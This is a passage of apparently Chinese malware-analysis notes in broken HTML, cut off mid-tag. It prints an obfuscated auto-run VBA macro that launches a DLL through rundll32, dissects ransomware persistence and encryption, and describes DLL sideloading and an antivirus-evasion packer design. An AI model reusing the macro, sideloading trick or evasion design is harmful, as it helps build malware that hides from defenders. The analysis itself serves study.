class=\"line\">OD附加winword进程</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### APT-Safebits 恶意样本之宏命令</span><br><span class=\"line\"></span><br><span class=\"line\">office中vba命令</span><br><span class=\"line\"></span><br><span class=\"line\">Microsoft 对象，this document定义了函数</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Private Sub Document_Open()<br>\nCall stetptwwo<br>\nEnd Sub</p>\n<p>Sub stetptwwo()</p>\n<p>Dim yy As String</p>\n<p>Dim vxcv As Integer<br>\nDim hugs As Integer<br>\nhugs = chek</p>\n<p>Dim ede As String<br>\nIf hugs = 1 Then<br>\nElse<br>\nDim edef As String</p>\n<p>Call hhhhh<br>\nDim pushstr As String<br>\npushstr = “\\W” &amp; “0r” &amp; “d.d”<br>\nDim geto As String<br>\nDim pus As String<br>\npus = “xe”<br>\ngeto = “nd”<br>\nDim ter As String</p>\n<p>Dim iof As String<br>\niof = “3”<br>\nter = “e”<br>\nDim jsd As String<br>\njsd = geto<br>\nDim hh As String<br>\nhh = iof &amp; “2.” &amp; ter &amp; pus<br>\nDim fps As String<br>\nfps = “r”<br>\nDim gpsa As String<br>\ngpsa = “,Unin”<br>\nDim fa As String<br>\nfa = fps &amp; “u” &amp; jsd &amp; “ll” &amp; hh<br>\nDim glops As String<br>\nglops = repid<br>\nDim regsrva As New Shell32.Shell<br>\nyy = glops &amp; yy &amp; pushstr &amp; “ll” &amp; gpsa &amp; “stallFont”</p>\n<p>Call regsrva.ShellExecute(fa, yy, &quot; &quot;, SW_SHOWNORMAL)<br>\nEnd If<br>\nEnd Sub</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">doc后缀可以改为zip解压后就可以解析其中的内容</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### dump内存</span><br><span class=\"line\"></span><br><span class=\"line\">使用hxd</span><br><span class=\"line\"></span><br><span class=\"line\">从指定偏移dump对应的字节数，复制到新的文件</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">## 勒索病毒</span><br><span class=\"line\"></span><br><span class=\"line\">勒索病毒文件一旦进入本地，就会自动运行，同时删除勒索软件样本，以躲避查杀和分析。接下来，勒索病毒利用本地的互联网访问权限连接至黑客的C&amp;C服务器，进而上传本机信息并下载加密私钥与公钥，利用私钥和公钥对文件进行加密。除了病毒开发者本人，其他人是几乎不可能解密。加密完成后，还会修改壁纸，在桌面等明显位置生成勒索提示文件，指导用户去缴纳赎金。且变种类型非常快，对常规的杀毒软件都具有免疫性。攻击的样本以exe、js、wsf、vbe等类型为主，对常规依靠特征检测的安全产品是一个极大的挑战。 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1.程序获取当前路径</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009191624078](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009191624078.png) </span><br><span class=\"line\"></span><br><span class=\"line\">执行结束后pathbuffer中</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009191909287](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009191909287.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">40f8ac是全局变量，将其先入栈，后面的call会对他赋值</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009191930103](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009191930103.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">call 401225 中，先获取了计算机名字和长度，接着使用加密算法计算出了一个字符串：</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009192057088](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009192057088.png) </span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009192748738](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009192748738.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">取出路径的最后一段，以\\分割，最后获取的为32131231.exe</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009193000324](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009193000324.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">写注册表，作为是否重复感染的依据</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009193304108](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009193304108.png) </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>signed int __cdecl sub_4010FD(int a1)<br>\n{<br>\nsize_t v1; // eax@7<br>\nint v2; // esi@7<br>\nLSTATUS v3; // eax@8<br>\nCHAR Buffer; // [sp+8h] [bp-2DCh]@1<br>\nchar v6; // [sp+9h] [bp-2DBh]@1<br>\n__int16 v7; // [sp+20Dh] [bp-D7h]@1<br>\nchar v8; // [sp+20Fh] [bp-D5h]@1<br>\nwchar_t Dest; // [sp+210h] [bp-D4h]@1<br>\nchar v10; // [sp+224h] [bp-C0h]@1<br>\nDWORD cbData; // [sp+2D8h] [bp-Ch]@8<br>\nint v12; // [sp+2DCh] [bp-8h]@1<br>\nHKEY phkResult; // [sp+2E0h] [bp-4h]@1</p>\n<p>qmemcpy(&amp;Dest, aSoftware, 0x14u);<br>\nBuffer = 0;<br>\nphkResult = 0;<br>\nmemset(&amp;v10, 0, 0xB4u);<br>\nmemset(&amp;v6, 0, 0x204u);<br>\nv7 = 0;<br>\nv8 = 0;<br>\nwcscat(&amp;Dest, Source);<br>\nv12 = 0;<br>\nwhile ( 1 )<br>\n{<br>\nif ( v12 )<br>\nRegCreateKeyW(HKEY_CURRENT_USER, &amp;Dest, &amp;phkResult);<br>\nelse<br>\nRegCreateKeyW(HKEY_LOCAL_MACHINE, &amp;Dest, &amp;phkResult);<br>\nif ( phkResult )<br>\n{<br>\nif ( a1 )<br>\n{<br>\nGetCurrentDirectoryA(0x207u, &amp;Buffer);<br>\nv1 = strlen(&amp;Buffer);<br>\nv2 = RegSetValueExA(phkResult, ValueName, 0, 1u, (const BYTE *)&amp;Buffer, v1 + 1) == 0;<br>\n}<br>\nelse<br>\n{<br>\ncbData = 519;<br>\nv3 = RegQueryValueExA(phkResult, ValueName, 0, 0, (LPBYTE)&amp;Buffer, &amp;cbData);<br>\nv2 = v3 == 0;<br>\nif ( !v3 )<br>\nSetCurrentDirectoryA(&amp;Buffer);<br>\n}<br>\nRegCloseKey(phkResult);<br>\nif ( v2 )<br>\nbreak;<br>\n}<br>\n++v12;<br>\nif ( v12 &gt;= 2 )<br>\nreturn 0;<br>\n}<br>\nreturn 1;<br>\n}</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">![image-20231009193613091](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009193613091.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">生成压缩包</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009194302116](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009194302116.png) </span><br><span class=\"line\"></span><br><span class=\"line\">位置为4100f0，大小为349635</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009194335290](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009194335290.png) </span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009194348280](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009194348280.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">存储了三个不同的钱包</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009195034297](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195034297.png) </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>int sub_401E9E()<br>\n{<br>\nint result; // eax@1<br>\nint v1; // eax@2<br>\nchar DstBuf; // [sp+0h] [bp-318h]@1<br>\nchar Dest; // [sp+B2h] [bp-266h]@2<br>\nchar *Source; // [sp+30Ch] [bp-Ch]@1<br>\nint v5; // [sp+310h] [bp-8h]@1<br>\nint v6; // [sp+314h] [bp-4h]@1</p>\n<p>Source = a13am4vw2dhxygx;<br>\nv5 = (int)a12t9ydpgwuez9n;<br>\nv6 = (int)a115p7ummngoj1p;<br>\nresult = sub_401000(&amp;DstBuf, 1);<br>\nif ( result )<br>\n{<br>\nv1 = rand();<br>\nstrcpy(&amp;Dest, (&amp;Source)[4 * (v1 % 3)]);<br>\nresult = sub_401000(&amp;DstBuf, 0);<br>\n}<br>\nreturn result;<br>\n}</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">创建隐藏文件夹</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009195412748](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195412748.png) </span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009195348027](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195348027.png) </span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009195442931](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195442931.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">给文件夹权限，给了w everyone特殊权限</span><br><span class=\"line\"></span><br><span class=\"line\">004020E8  |.  68 FCF44000   push    0040F4FC                                         ;  ASCII &quot;icacls . /grant Everyone:F /T /C /Q&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009195855402](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195855402.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">加载dll敏感函数来免杀</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009195952448](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195952448.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">调用Microsoft标准加密函数</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231009200731756](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009200731756.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">- Wannacry功能分析之（启动进程创建隐藏窗口）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">- Wannacry功能分析之（创建持久化启动）</span><br><span class=\"line\"></span><br><span class=\"line\">1. ```</span><br><span class=\"line\">   reg_key:</span><br><span class=\"line\">   HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\tymaupesi628</span><br><span class=\"line\">   reg_value:</span><br><span class=\"line\">   &quot;C:\\Users\\vbccsb\\AppData\\Local\\Temp\\tasksche.exe&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"img\"><img data-src=\"data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==\" alt=\"点击并拖拽以移动\"></p>\n<p>Wannacry 功能分析之（加密文件后缀类型）</p>\n<ol start=\"2\">\n<li>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/31919a0937aa4606898a218b9fe2ff09.png\" alt=\"img\"></p>\n</li>\n<li>\n<p>Wannacry 功能分析之（加密文件内容算法）</p>\n</li>\n<li>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/61522c2f27024a4fa0dc51b70d7d6d15.png\" alt=\"img\"></p>\n</li>\n</ol>\n<ul>\n<li>Wannacry 功能分析之（查找要加密的文件）</li>\n</ul>\n<ol>\n<li><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/4357e672afa246d897b10c4892d75bf6.png\" alt=\"img\"></li>\n</ol>\n<ul>\n<li>Wannacry 功能分析之（DllLoader）</li>\n</ul>\n<ol>\n<li>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/8fc91bd6a3cc477b811d026bbde0bcd6.png\" alt=\"img\"></p>\n</li>\n<li>\n<pre><code>00402136  |.  FF75 FC       push    [local.1]\n00402139  |.  50            push    eax\n0040213A  |.  E8 7E000000   call    004021BD\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">   ![img](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">3. ```</span><br><span class=\"line\">   004023EF  |&gt; \\56            push    esi</span><br><span class=\"line\">   004023F0  |.  E8 EA030000   call    004027DF</span><br><span class=\"line\">   004023F5  |.  85C0          test    eax,eax</span><br><span class=\"line\">   004023F7  |.  59            pop     ecx</span><br><span class=\"line\">   004023F8  |.  74 3C         je      short 00402436</span><br><span class=\"line\">   004023FA  |.  56            push    esi</span><br><span class=\"line\">   004023FB  |.  E8 4B010000   call    0040254B</span><br><span class=\"line\">   00402400  |.  85C0          test    eax,eax</span><br><span class=\"line\">   00402402  |.  59            pop     ecx</span><br><span class=\"line\">   00402403  |.  74 31         je      short 00402436</span><br><span class=\"line\">   00402405  |.  56            push    esi</span><br><span class=\"line\">   00402406  |.  E8 12030000   call    0040271D</span><br><span class=\"line\">   0040240B  |.  85C0          test    eax,eax</span><br><span class=\"line\">   0040240D  |.  59            pop     ecx</span><br><span class=\"line\">   0040240E  |.  74 26         je      short 00402436</span><br><span class=\"line\">   00402410  |.  8B06          mov     eax,dword ptr ds:[esi]</span><br><span class=\"line\">   00402412  |.  33C9          xor     ecx,ecx</span><br><span class=\"line\">   00402414  |.  8B40 28       mov     eax,dword ptr ds:[eax+0x28]</span><br><span class=\"line\">   00402417  |.  3BC1          cmp     eax,ecx</span><br><span class=\"line\">   00402419  |.  74 32         je      short 0040244D</span><br><span class=\"line\">   0040241B  |.  394E 14       cmp     dword ptr ds:[esi+0x14],ecx</span><br><span class=\"line\">   0040241E  |.  74 26         je      short 00402446</span><br><span class=\"line\">   00402420  |.  51            push    ecx</span><br><span class=\"line\">   00402421  |.  57            push    edi</span><br><span class=\"line\">   00402422  |.  03C3          add     eax,ebx</span><br><span class=\"line\">   00402424  |.  53            push    ebx</span><br><span class=\"line\">   00402425  |.  FFD0          call    eax  --------------------jmp Loader</span><br></pre></td></tr></table></figure>\n\n![img](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)\n\n \n\n</code></pre>\n</li>\n<li>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/54cd71777a994c219616249af01230a5.png\" alt=\"img\"></p>\n</li>\n</ol>\n<ul>\n<li>Wannacry 功能分析之（免杀结构）</li>\n</ul>\n<h2 id=\"白黑样本快速分析\"><a class=\"markdownIt-Anchor\" href=\"#白黑样本快速分析\">#</a> 白 + 黑样本快速分析</h2>\n<ol>\n<li>利用了大公司代码的编写缺陷，比如某个应用 exe 程序，自带数字签名，他运行的时候会动态加载其目录下的 dll 文件（loadlibrary），getprocaddress 使用 dll 的扩展函数，但是 loadlibrary 的 dll 并未作验证，这样我们只要将我们编写的同名木马 dll 放到他的目录下，运行这个带有签名的 exe，让我们的木马 dll 加载到一个绝对可信空间，杀毒软件碍于性能，检验粒度不可能精确到 dll 模块，所以 exe 的绝对可信会导致杀软放行一切行为，实施攻击。</li>\n<li>众所周知，数字签名是保证信息传输完整性、真实性、安全性及身份认证的一个验证方式，被广泛应用银行、电子政务及电子协议等互联网领域，但近年来却不断被不法分子所利用，成为不法分子谋取私利的工具。</li>\n</ol>\n<p>进程调用链，通过遍历 eprocess，遍历到进程和他的父进程</p>\n<p>动态加载自身 dll，需要判断路径真实有效，数字签名是否合法</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231010174508685.png\" alt=\"image-20231010174508685\"></p>\n<p>kernel32.GetNoduleFileHaneA</p>\n<p>user32.GetForegroundwindow</p>\n<p>user32.GetInputstate</p>\n<h2 id=\"加壳\"><a class=\"markdownIt-Anchor\" href=\"#加壳\">#</a> 加壳</h2>\n<p>软件加壳的目的是为了防止外部程序对软件进行静态反汇编分析或者动态分析达到对软件保护的目的。壳子的种类很多，大体种类分 2 种二进制壳和指令壳，二进制壳不改变硬编码的含义，指令壳则改变了原有硬编码的含义。 本篇文章介绍二进制壳的加壳的一种思路及实现。</p>\n<p>加过壳的程序在 IDA 中 Function name 都是空的，IDA 无法正常识别</p>\n<p>加壳后节的区段和偏移大小也不一样</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231011221203361.png\" alt=\"image-20231011221203361\"></p>\n<p>PEID 查壳原理</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231011221415342.png\" alt=\"image-20231011221415342\"></p>\n<p>加过壳的程序入口变为壳的代码</p>\n<p>添加壳区段，隐藏原来的区段。先跑壳代码，在执行原来的代码</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231010141450257.png\" alt=\"image-20231010141450257\"></p>\n<h4 id=\"恶意软件免杀壳\"><a class=\"markdownIt-Anchor\" href=\"#恶意软件免杀壳\">#</a> 恶意软件免杀壳</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">经过10多年的发展，反病毒引擎已经在误报&amp;查毒粒度之间取了一个比较好的平衡，常规的免杀技术（特征码免杀、源码免杀）处理成本越来越高。不过反病毒引擎天然存在某些&quot;缺陷&quot;，例如正常软件会加商业保护壳，导致会受到商业壳的制约，无法将所有壳标记为病毒。</span><br><span class=\"line\"></span><br><span class=\"line\">由于内存执行&quot;被加壳程序&quot;是壳的基础行为，而内存执行PE这个&quot;壳的基础行为&quot;可以很好的将&quot;被加壳程序&quot;的特征码隐藏起来。因此编写一款无特征码壳是一个非常好的反杀软查杀(特征码、启发式)的方案。</span><br><span class=\"line\"></span><br><span class=\"line\">模拟正常PE程序结构, 模拟正常PE程序结构, 模拟正常PE程序结构</span><br><span class=\"line\"></span><br><span class=\"line\">特征代码最小化，并且被查杀后可通过混淆引擎来混淆壳代码，达到快速变种、快速免杀的效果。</span><br><span class=\"line\"></span><br><span class=\"line\">笔者不建议进行任何可能提高程序熵值的操作，尽可能将壳程序的PE格式、数据结构、代码执行顺序与正常程序保持一致。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这个免杀壳的代码主要分为三部分：</span><br><span class=\"line\"></span><br><span class=\"line\">加壳器：这部分代码用来将被加壳程序、傀儡程序、壳代码拼装处理，组合生成一个免杀的PE文件。</span><br><span class=\"line\"></span><br><span class=\"line\">CodeLoader（壳代码）：这部分代码用来反杀毒引擎、内存加载执行PeLoader，需要编译为Shellcode代码。</span><br><span class=\"line\"></span><br><span class=\"line\">PeLoader（壳代码）：这部分代码用来内存执行Shelled（被加壳程序），需要编译为Shellcode代码。</span><br></pre></td></tr></table></figure>\n<p>特征码免杀法：最基本的免杀技术</p>\n<p>通用免杀法：替换资源、增加签名、加冷门壳、加多重壳</p>\n<p>源码免杀法：当前主流免杀技术，需要有源代码才能操作。通过修改病毒的特征字符串、动态 API 调用、修改编译环境、套程序外壳 (MFC、SDK、QT) 等</p>\n<p>输入表 (IAT) 免杀法：启发式引擎会扫描目标程序的输入表中是否含指定的函数特征序列 (函数调用特征码)。</p>\n<p>代码混淆、加花：通过对特征代码进行膨胀、乱序来干扰启发式引擎的分析，以及提升人工提取特征码的难度。</p>\n<p>入口点模糊技术：参考 &quot;主要技术&quot; 目录下的 &quot;入口点模糊技术&quot;</p>\n<p>内存加载执行 PE 文件：壳的基本技术，论坛资料很多。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231011230004404.png\" alt=\"image-20231011230004404\"></p>\n<h4 id=\"反调试原理\"><a class=\"markdownIt-Anchor\" href=\"#反调试原理\">#</a> 反调试原理</h4>\n<p>使用 Windows API<br>\n 使用 Windows API 函数检测调试器是否存在是最简单的反调试技术。Windows 操作系统中提供了这样一些 API，应用程序可以通过调用这些 API，来检测自己是否正在被调试。这些 API 中有些是专门用来检测调试器的存在的，而另外一些 API 是出于其他目的而设计的，但也可以被改造用来探测调试器的存在。其中很小部分 API 函数没有在微软官方文档显示。通常，防止恶意代码使用 API 进行反调试的最简单的办法是在恶意代码运行期间修改恶意代码，使其不能调用探测调试器的 API 函数，或者修改这些 API 函数的返回值，确保恶意代码执行合适的路径。与这些方法相比，较复杂的做法是挂钩这些函数，如使用 rootkit 技术。<br>\n1.1IsDebuggerPresent<br>\nIsDebuggerPresent 查询进程环境块 (PEB) 中的 IsDebugged 标志。如果进程没有运行在调试器环境中，函数返回 0；如果调试附加了进程，函数返回一个非零值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span 